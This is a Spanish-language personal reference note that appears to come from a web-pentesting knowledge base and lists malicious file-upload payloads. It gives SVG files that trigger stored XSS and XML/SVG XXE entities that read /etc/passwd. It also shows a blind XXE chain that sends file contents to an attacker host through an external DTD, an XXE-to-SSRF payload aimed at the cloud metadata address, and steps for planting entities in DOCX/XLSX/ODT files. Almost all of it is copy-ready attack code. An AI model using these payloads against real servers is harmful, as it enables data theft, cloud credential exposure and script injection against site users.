---
tipo: meta
aliases:
  - Payloads SVG XSS XXE
  - archivos maliciosos
tags:
  - meta/referencia
  - dominio/web
---

# File upload - archivos maliciosos - matriz de referencia

> [!info] Referencia pura, no un zettel
> Contenido de los archivos que se suben para XSS almacenado (SVG servido) o XXE (XML parseado). Criterio en [[File upload - SVG y XSS almacenado]] y [[File upload - XXE por archivo]]. `yi``  ` copia.

## SVG con XSS

Se sube como imagen; ejecuta al servirse inline.

```svg
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

```svg
<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>
```

```svg
<svg xmlns="http://www.w3.org/2000/svg"><image href="x" onerror="alert(document.domain)"/></svg>
```

## SVG con XXE — lectura de archivos

Se sube donde el server **rasteriza** el SVG (parser XML).

```svg
<?xml version="1.0"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><text x="0" y="20">&xxe;</text></svg>
```

El contenido de `/etc/passwd` queda dibujado en la imagen rasterizada.

## XML genérico — XXE lectura

Cuando la app importa un XML directo.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```

## XXE out-of-band (blind)

Cuando no hay salida reflejada: exfil por una DTD externa.

En el archivo subido:
```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % dtd SYSTEM "http://atacante.com/x.dtd"> %dtd;]>
<r>&exfil;</r>
```

En `http://atacante.com/x.dtd`:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://atacante.com/c?d=%file;'>">
%wrap;
```

El server lee el archivo y lo manda en la URL a tu recolector.

## XXE a SSRF

```xml
<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<r>&xxe;</r>
```

Apuntar la entidad a un servicio interno o al metadata de cloud.

## DOCX / XLSX / ODT

Son ZIP de XML. Se descomprime, se inyecta la entidad en `word/document.xml` (o `content.xml` en ODT), se recomprime y se sube. El parser ofimático del server la resuelve al procesar.

## Relacionadas

[[File upload - SVG y XSS almacenado]] · [[File upload - XXE por archivo]] · [[MOC - File upload]]
